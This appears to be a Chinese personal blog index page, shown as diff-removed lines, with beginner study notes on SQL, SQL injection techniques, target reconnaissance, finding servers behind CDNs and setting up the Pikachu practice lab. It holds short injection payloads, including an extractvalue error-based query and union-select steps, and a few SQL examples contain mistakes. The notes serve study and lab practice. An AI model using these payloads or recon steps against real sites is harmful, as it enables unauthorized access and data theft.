-</blockquote>
-<blockquote>
-<p>birthday varchar(10) not null;</p>
-</blockquote>
-<h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><p>   插入数据<br>insert into student<br>values(  )  #()里面写的是要插入的内容<br>增加一列<br>alter table school add </p>
-<h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><p>更新表中的数据<br>update student set  birthday&#x3D;”19991204”  where name&#x3D;”张三”；</p>
-<h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><p>DELETE FROM name  WHERE student;</p>
-<h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p>select * from student      ##查询所有的数据来着student这个表<br>union select     ##联合查询连同前面的一起查询<br>select  concat（name，birthday）    ##把两个字符串连接起来变成一个字符串<br>group_concat（id）  ##把id的内容全显示在一行<br>ORDER BY    ##用于对结果集按照一个列或者多个列进行排序</p>
-<p>substring（admin，1，1）    #截取admin这个字符串的第一字母一次截取一位</p>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。</p>
-<h5 id="sql注的原因"><a href="#sql注的原因" class="headerlink" title="sql注的原因"></a>sql注的原因</h5><p>用户提交的参数数据未做充分检查过滤</p>
-<h5 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h5><p>1.数据泄露：数据库中存放的用户隐私信息的泄露<br>2.网页纂改：通过操作数据库对特定的网页进行纂改<br>3.网站挂马：修改数据库一些字段的值，嵌入木马链接，进行挂马攻击<br>4.服务器被远程控制被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统<br>5.数据破坏：数据库服务器被攻击，数据库的系统管理员帐户被窜改，系统瘫痪</p>
-<h3 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h3><h4 id="按数据类型分可以分为数字型和字符型"><a href="#按数据类型分可以分为数字型和字符型" class="headerlink" title="按数据类型分可以分为数字型和字符型"></a>按数据类型分可以分为数字型和字符型</h4><p>如何判断是数字型还是字符型 写入1  and 1&#x3D;1  再写入and 1&#x3D;2 在语句最后使用–+把后面的语句进行注释 来查看页面是否正常回显来判断是字符注入还是数字注入<br>一般的过程为<br>1.判断注入点</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821191950958.png" alt="image-20230821191950958"></p>
-<p>2.猜字段数：order by<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821192043227.png" alt="image-20230821192043227"></p>
-<p>3.找回显：union select<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821192119397.png" alt="image-20230821192119397"><br>4.然后在回显处注入 database()、user（）等等函数<img src="/sql%E6%B3%A8%E5%85%A5.assets/image-20230821192149975.png" alt="image-20230821192149975"></p>
-<h4 id="按照返回结果可以分为盲注型和报错型"><a href="#按照返回结果可以分为盲注型和报错型" class="headerlink" title="按照返回结果可以分为盲注型和报错型"></a>按照返回结果可以分为盲注型和报错型</h4><p>bool注入：bool注入是盲注的一种，与报错注入不同，bool注入没有任何报错信息输出，页面返回只有正常和不正常两种状态，攻击者只能通过返回的这两个状态来判断输入的测试SQL语句是否正确，从而判断数据库中的存储了哪些信息。</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821192631697.png" alt="image-20230821192631697"></p>
-<p>注入过程大致一样只是在注入是根据页面的正确与否来判断注入的语句是否正确</p>
-<p>因为页面没有回显点所以只能使用burp抓包进行爆破来读取内容</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821195947891.png" alt="image-20230821195947891"></p>
-<p>如图成功爆破出了数据库名</p>
-<h4 id="当页面彻底没有反应的时候就要使用睡眠注入了"><a href="#当页面彻底没有反应的时候就要使用睡眠注入了" class="headerlink" title="当页面彻底没有反应的时候就要使用睡眠注入了"></a>当页面彻底没有反应的时候就要使用睡眠注入了</h4><p>利用sleep函数去寻找闭合点</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821205544092.png" alt="image-20230821205544092"></p>
-<p>这里可以看到他闭合了就网页就开始休眠同理也能够</p>
-<p>使用burp根据休眠时间成功爆破出想要的数据</p>
-<h4 id="当一些查询的关键字被过滤了无法进行查询的时候可以使用报错注入"><a href="#当一些查询的关键字被过滤了无法进行查询的时候可以使用报错注入" class="headerlink" title="当一些查询的关键字被过滤了无法进行查询的时候可以使用报错注入"></a>当一些查询的关键字被过滤了无法进行查询的时候可以使用报错注入</h4><p>and extractvalue(1,concat(0x7e,(database()),0x7e)) </p>
-<p>使用报错语句就能成功回显</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821213224093.png" alt="image-20230821213224093"></p>
-<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="宽字节注入（）"><a href="#宽字节注入（）" class="headerlink" title="宽字节注入（）"></a>宽字节注入（）</h4><p>   宽字节注入漏洞产生的原因：开发者为了防止出现SQL注入攻击，将用户输入的数据用addslashes等函数进行过滤。addslashes等函数会默认将单引号等字符进行转义，这样就可以避免注入。宽字节注入产生的原因是MySQL在使用GBK编码的时候，如果第一个字符的ASCII码大于128时，会认为两个字符是一个汉字，会将后面的转义字符“\”吃掉，拼接为汉字，这样就可以将SQL语句闭合，造成宽字节注入。</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230821215017263.png" alt="image-20230821215017263"></p>
-<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>先往数据库里面写入一条数据污染数据库然后在修改时直接利用污染的数据达到修改管理员密码的目的</p>
-<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><h4 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h4><p>有些站点会对sql语句空格特殊字符进行严格的过滤就导致写入的sql语句不能正常执行</p>
-<p>这个时候就需要我们想办法使用特殊手段对这些过滤的东西进行绕过从而达到查询数据目的</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230808203836404.png" alt="image-20230808203836404"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/08/08/sql%E6%B3%A8%E5%85%A5/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-        <h2 class="post-title">信息收集</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/4
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h3 id="1-首先先确认一个目标然后使用ICP备案网查询ICP-IP地址-域名信息备案管理系统-miit-gov-cn-获取目标的域名"><a href="#1-首先先确认一个目标然后使用ICP备案网查询ICP-IP地址-域名信息备案管理系统-miit-gov-cn-获取目标的域名" class="headerlink" title="1.首先先确认一个目标然后使用ICP备案网查询ICP&#x2F;IP地址&#x2F;域名信息备案管理系统 (miit.gov.cn)获取目标的域名"></a>1.首先先确认一个目标然后使用ICP备案网查询<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统 (miit.gov.cn)</a>获取目标的域名</h3><p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.jpg.jpeg" alt="信息收集.jpg"></p>
-<h3 id="2-然后使用企查查爱企查查询收集目标信息"><a href="#2-然后使用企查查爱企查查询收集目标信息" class="headerlink" title="2.然后使用企查查爱企查查询收集目标信息"></a>2.然后使用企查查爱企查查询收集目标信息</h3><p>可收集的信息有</p>
-<p>法人 </p>
-<p>公司电话信息（网站管理者或公司固定电话） </p>
-<p>邮箱信息（可从邮箱后缀，猜测是否存在邮箱服务器等） </p>
-<p>地址 官网和其他网站备案信息（有可能其他域名也在同一台服务器上） 股东信息，主要成员（一般主要人员都会具有公司中的系统很大一部分权限） </p>
-<p>具体的公司经营情况，和业务范围</p>
-<h3 id="3-收集完成后开始挖掘子域名和真实IP"><a href="#3-收集完成后开始挖掘子域名和真实IP" class="headerlink" title="3.收集完成后开始挖掘子域名和真实IP"></a>3.收集完成后开始挖掘子域名和真实IP</h3><h4 id="3-1收集子域名前查看是否存在cdn"><a href="#3-1收集子域名前查看是否存在cdn" class="headerlink" title="3.1收集子域名前查看是否存在cdn"></a>3.1收集子域名前查看是否存在cdn</h4><p>使用多地ping或者使用nslookup命令去查看如果IP一致的话大概率是没有使用cdn服务的</p>
-<h4 id="3-2子域名收集"><a href="#3-2子域名收集" class="headerlink" title="3.2子域名收集"></a>3.2子域名收集</h4><p>a.使用在线子域名爆破</p>
-<p>b.使用软件子域名挖掘机</p>
-<p>c.使用搜索引擎的语法来进行收集比如说 site：</p>
-<p>对收集好的子域名进行访问</p>
-<h4 id="3-3IP的收集"><a href="#3-3IP的收集" class="headerlink" title="3.3IP的收集"></a>3.3IP的收集</h4><p>a.使用网络空间引擎进行搜索</p>
-<p>b.利用IP去反查域名</p>
-<p>c.或者使用dns反向解析记录</p>
-<p>收集到网络的真实IP</p>
-<h4 id="3-4知道IP以后去扫描端口"><a href="#3-4知道IP以后去扫描端口" class="headerlink" title="3.4知道IP以后去扫描端口"></a>3.4知道IP以后去扫描端口</h4><p>a.Nmap</p>
-<p>b.御剑端口扫描</p>
-<p>收集到真实IP后开启扫描</p>
-<p>扫描端口查看目标网站开启了什么服务</p>
-<h3 id="4-指纹信息的收集"><a href="#4-指纹信息的收集" class="headerlink" title="4.指纹信息的收集"></a>4.指纹信息的收集</h3><p>指纹收录平台、TideFinger潮汐指纹等指纹查询平台。</p>
-<p>可以收集中英文排版、开发语言、框架、CDN等。</p>
-<h3 id="5-扫描目标网站的目录"><a href="#5-扫描目标网站的目录" class="headerlink" title="5.扫描目标网站的目录"></a>5.扫描目标网站的目录</h3><p>a.disearch</p>
-<p>b.dirb</p>
-<p>使用这两个工具扫描网站的目录查看网页结构</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/08/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">
-        <h2 class="post-title">计算机基础</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/4
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h2 id="1-HTTP响应码"><a href="#1-HTTP响应码" class="headerlink" title="1.HTTP响应码"></a>1.HTTP响应码</h2><h3 id="信息响应-100-199）"><a href="#信息响应-100-199）" class="headerlink" title="信息响应(100-199）"></a>信息响应(100-199）</h3><h3 id="成功响应（200-299）"><a href="#成功响应（200-299）" class="headerlink" title="成功响应（200-299）"></a>成功响应（200-299）</h3><p>200：请求成功</p>
-<p>请求方式：主要的请求方式有两种一个叫“GET”一个叫“POST”</p>
-<p>比如说豆瓣的top250   <a target="_blank" rel="noopener" href="https://movie.douban.com/top250">https://movie.douban.com/top250</a> 这个网站的host就为 movie.douban.com</p>
-<h3 id="重定向信息（300-399）"><a href="#重定向信息（300-399）" class="headerlink" title="重定向信息（300-399）"></a>重定向信息（300-399）</h3><h3 id="客户端错误响应（400-499）"><a href="#客户端错误响应（400-499）" class="headerlink" title="客户端错误响应（400-499）"></a>客户端错误响应（400-499）</h3><p>401：未授权</p>
-<p>402：需要付费</p>
-<p>403：静止访问</p>
-<p>404：无法找到</p>
-<p>405：方法不被允许</p>
-<p>406：无法接收</p>
-<p>408：请求超时</p>
-<p>409：指令冲突</p>
-<h3 id="服务端错误响应（500-599）"><a href="#服务端错误响应（500-599）" class="headerlink" title="服务端错误响应（500-599）"></a>服务端错误响应（500-599）</h3><p>500：内部服务器错误</p>
-<p>599：网络连接超时</p>
-<h2 id="2-数据包结构"><a href="#2-数据包结构" class="headerlink" title="2.数据包结构"></a>2.数据包结构</h2><p><img src="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80.assets/image-20230804111248965.png" alt="image-20230804111248965"></p>
-<p>数据包结构以我抓的这个豆瓣TOP250为例</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230804112312096.png" alt="image-20230804112312096"><br>请求有重点关注GET和POST请求</p>
-<p><strong>GET: 请求指定的页面信息，并返回实体主体。</strong></p>
-<p><strong>POST:向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</strong></p>
-<p>HEAD:类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</p>
-<p>DELETE:请求服务器删除指定的页面。</p>
-<p>CONNECT:HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</p>
-<p>OPTIONS:允许客户端查看服务器的性能。</p>
-<p>TRACE:回显服务器收到的请求，主要用于测试或诊断。</p>
-<p>PATCH:是对 PUT 方法的补充，用来对已知资源进行局部更新 。</p>
-<p>PUT:从客户端向服务器传送的数据取代指定的文档的内容。</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230804113254032.png" alt="image-20230804113254032"><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230804122431895.png" alt="image-20230804122431895"></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230804123121665.png" alt="image-20230804123121665"></p>
-<p>操作系统的常用命令</p>
-<p>window命令如图</p>
-<p>先使用win+R 然后输入cmd</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230804124538078.png" alt="image-20230804124538078"></p>
-<p>进入到命令提示符页面输入D: 进入到D盘然后使用cd进入这个盘的目录下<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230804124710145.png" alt="image-20230804124710145"></p>
-<p>利用dir命令查看文件的里面都有什么</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230804124833595.png" alt="image-20230804124833595"></p>
-<p>我这只是一些最基础的命令测试需要更详细的请访问</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2761c8c51fab">windows–CMD–命令大全</a></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-    </div>
-    <a href="/2023/08/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/07/29/%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/">
-        <h2 class="post-title">靶场的搭建</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/7/29
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="靶场的搭建"><a href="#靶场的搭建" class="headerlink" title="靶场的搭建"></a>靶场的搭建</h1><p>1.首先准备搭建靶场的工具</p>
-<p>这里我会选择使用<a target="_blank" rel="noopener" href="https://www.apachefriends.org/zh_cn/index.html">xampp</a>这款软件来搭建服务器</p>
-<p>使用<a target="_blank" rel="noopener" href="https://notepad-plus-plus.org/downloads/v8.5.4/">npp</a>这个软件来查看和编辑代码</p>
-<p>最重要的是从<a target="_blank" rel="noopener" href="https://github.com/">github</a>上下载一个靶场<a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
-<p>这里我使用的是github上的一个开源靶场叫做<a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a>下载zip后进行安装</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729225530428.png" alt="image-20230729225530428"></p>
-<p>将pikachu解压到xampp这个软件安装的htdocs目录下点击</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729230251128.png" alt="image-20230729230251128"></p>
-<p>这里可以看到已经在该目录下了<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729230428634.png" alt="image-20230729230428634"></p>
-<p>双击这个文件进去以后再双击inc这个文件夹可以看到一个叫config.inc.php的文件右击以notepad打开</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729232624265.png" alt="image-20230729232624265"></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729232726158.png" alt="image-20230729232726158"></p>
-<p>进去以后你就能看到以下画面<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729233011243.png" alt="image-20230729233011243"></p>
-<p>这个时候就需要你打开xampp这个软件开启Apache和MySQL服务</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729233155086.png" alt="image-20230729233155086"></p>
-<p>开启后可以点击admin设置密码</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729233635482.png" alt="image-20230729233635482"></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729233739490.png" alt="image-20230729233739490"></p>
-<p>设置完成以后打开之前使用notepad打开的文件按照后面的注释填写相对应的信息因为我这里设置是root是无密码的情况所以我的密码这栏为空如果你设置了密码那么就将相对应的密码填写进去</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729234123392.png" alt="image-20230729234123392"></p>
-<p>然后打开浏览器输入<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1/</a>  <strong>pikachu-master</strong>   #加粗的地方为你解压后的文件名</p>
-<p>进去以后网站会提醒你进行初始化设置</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729234757694.png" alt="image-20230729234757694"></p>
-<p>初始化完成以后你的靶场就搭建完成了</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/07/29/%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/07/29/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87cdn/">
-        <h2 class="post-title">挖掘真实地址</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/7/29
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="绕过cdn"><a href="#绕过cdn" class="headerlink" title="绕过cdn"></a>绕过cdn</h1><h4 id="为什么需要DNS把域名-解析为地址？"><a href="#为什么需要DNS把域名-解析为地址？" class="headerlink" title="为什么需要DNS把域名 解析为地址？"></a>为什么需要DNS把域名 解析为地址？</h4><p>网络通讯大部分是基于TCP&#x2F;IP的，而TCP&#x2F;IP是基于IP地址的，所以计算机在网络上进行通讯时只能识别如IP地址，而不能认识域名。我们没有办法记住很多的IP地址，所以我们在访问网站的时候就会输入诸如 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> 这样的域名就能访问到相对应的网站，这些域名是有一个名为“DNS”的服务器把输入的域名解析成一个IP地址然后访问这个地址进入对应的页面。</p>
-<h4 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h4><p>DNS(<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem)翻译过来就是”域名系统“是互联网的一项服务。它作为将域名和IP地址)相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。</p>
-<p>他的工作原理如下：</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729210151855.png" alt="image-20230729210151855"></p>
-<h4 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h4><p>cdn(<strong>C</strong>ontent <strong>D</strong>elivery <strong>N</strong>etwork或<strong>C</strong>ontent <strong>D</strong>istribution <strong>N</strong>etwork)的缩写翻译过来即<strong>内容分发网络</strong>是指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p>
-<p>cdn还有个好处就是能够隐藏自己的真实IP让攻击者找不到真实的IP无法攻击。但是这也不是绝对的，还能通过一些特殊的方法和手段去绕过cdn，比如说使用</p>
-<blockquote>
-<ol>
-<li>nslookup</li>
-</ol>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729210539740.png" alt="image-20230729210539740"></p>
-<p>如果DNS解析出多个IP则大概率使用了cdn服务。</p>
-<blockquote>
-<ol start="2">
-<li>全球ping</li>
-</ol>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729212733442.png" alt="image-20230729212733442"></p>
-<p>查看ping的IP结果是否唯一若不唯一大概率使用了cdn服务</p>
-<p>或者使用别的办法绕cdn比如说挖掘子域名因为一些大型网站项目众多有一些子资产可能没有使用cdn这样我我们就能从子域名入手来查找真实的IP地址</p>
-<blockquote>
-<ol start="3">
-<li>例如：Layer子域名挖掘机 、subDomainsBrute等等工具</li>
-</ol>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729223053025.png" alt="image-20230729223053025"></p>
-<blockquote>
-<ol start="4">
-<li>查找网站历史DNS</li>
-</ol>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729220230437.png" alt="image-20230729220230437"></p>
-<p><a target="_blank" rel="noopener" href="https://www.dnsdb.io/zh-cn">https://www.dnsdb.io/zh-cn</a></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729220420183.png" alt="image-20230729220420183"></p>
-<blockquote>
-<ol start="5">
-<li>空间搜索引擎</li>
-</ol>
-</blockquote>
-<p>钟馗之眼：<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729221234391.png" alt="image-20230729221234391"></p>
-<p>撒旦：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230729221251550.png" alt="image-20230729221251550"></p>
-<p>fofa：<a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a> 	<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230731154435357.png" alt="image-20230731154435357"></p>
-<p>等等工具进行查询</p>
-<blockquote>
-<ol start="6">
-<li>泛解析</li>
-</ol>
-</blockquote>
-<p>泛解析：是指利用 <strong>“ * ”</strong> 来做子域名，实现所有的子域名都指向同一个IP地址</p>
-<p>例如：*.taobao.com</p>
-<p>这样设置以后所有的子域名都会指向同一ip地址。</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/07/29/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87cdn/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/07/26/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/">
-        <h2 class="post-title">我的hexo的部署</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/7/26
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="我的hexo的部署"><a href="#我的hexo的部署" class="headerlink" title="我的hexo的部署"></a>我的hexo的部署</h1><p>所要用到的环境和软件有(node.js)[<a target="_blank" rel="noopener" href="https://nodejs.org/en]">https://nodejs.org/en]</a> 和(GIt)[<a target="_blank" rel="noopener" href="https://git-scm.com/downloads]">https://git-scm.com/downloads]</a> 还需要一个github账号。</p>
-<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="1-在本地目录中新建一个文件夹，用来存放博客的原文件，路径不能有中文。"><a href="#1-在本地目录中新建一个文件夹，用来存放博客的原文件，路径不能有中文。" class="headerlink" title="1.在本地目录中新建一个文件夹，用来存放博客的原文件，路径不能有中文。"></a>1.在本地目录中新建一个文件夹，用来存放博客的原文件，路径不能有中文。</h4><h4 id="2-鼠标右击新建的文件夹点击Git-Bash-Here"><a href="#2-鼠标右击新建的文件夹点击Git-Bash-Here" class="headerlink" title="2.鼠标右击新建的文件夹点击Git Bash Here"></a>2.鼠标右击新建的文件夹点击Git Bash Here<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727112228695.png" alt="image-20230727112228695"></h4><h4 id="3-输入命令安装hexo"><a href="#3-输入命令安装hexo" class="headerlink" title="3.输入命令安装hexo"></a>3.输入命令安装hexo</h4><blockquote>
-<p>npm install -g hexo-cli<br>hexo init blog<br>cd blog<br>hexo g </p>
-</blockquote>
-<blockquote>
-<ul>
-<li>构建成功后的效果：</li>
-</ul>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727112337898.png" alt="image-20230727112337898"></p>
-<h4 id="4-cd进入这个目录"><a href="#4-cd进入这个目录" class="headerlink" title="4.cd进入这个目录"></a>4.cd进入这个目录</h4><blockquote>
-<ul>
-<li>检测一下网络的雏形按顺序敲入以下三条命令</li>
-</ul>
-</blockquote>
-<blockquote>
-<p>hexo new test_my_site<br>hexo g<br>hexo s </p>
-</blockquote>
-<blockquote>
-<ul>
-<li>三条命令输入以后就能成功访问127.0.0.1:4000</li>
-</ul>
-</blockquote>
-<h4 id="5-配置ssh"><a href="#5-配置ssh" class="headerlink" title="5.配置ssh"></a>5.配置ssh</h4><blockquote>
-<p>cd ~&#x2F;.ssh #检查本机已存在的ssh密钥                          </p>
-<ul>
-<li>如果提示：No such file or directory 说明你是第一次使用git。<br>ssh-keygen -t rsa -C “邮件地址”</li>
-</ul>
-</blockquote>
-<blockquote>
-<ul>
-<li>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key： <img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727144949228.png" alt="image-20230727144949228"></li>
-</ul>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727144653150.png" alt="image-20230727144653150"></p>
-<p>将在C:\Users\Administrator.ssh\id_rsa.pub复制过来的内容填入key中<br>如图：</p>
-<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230727145542343.png" alt="image-20230727145542343"></p>
-<blockquote>
-<ul>
-<li>ssh的密钥填入后使用命令查看是否能够通<br>ssh -T <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#x2e;&#99;&#111;&#x6d;">&#x67;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#x2e;&#99;&#111;&#x6d;</a>       #后面的<a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;">&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#116;&#x68;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;</a>不用改</li>
-</ul>
-</blockquote>
-<p>如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到<br><em>Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access.</em><br>看到这个以后就算是成功了</p>
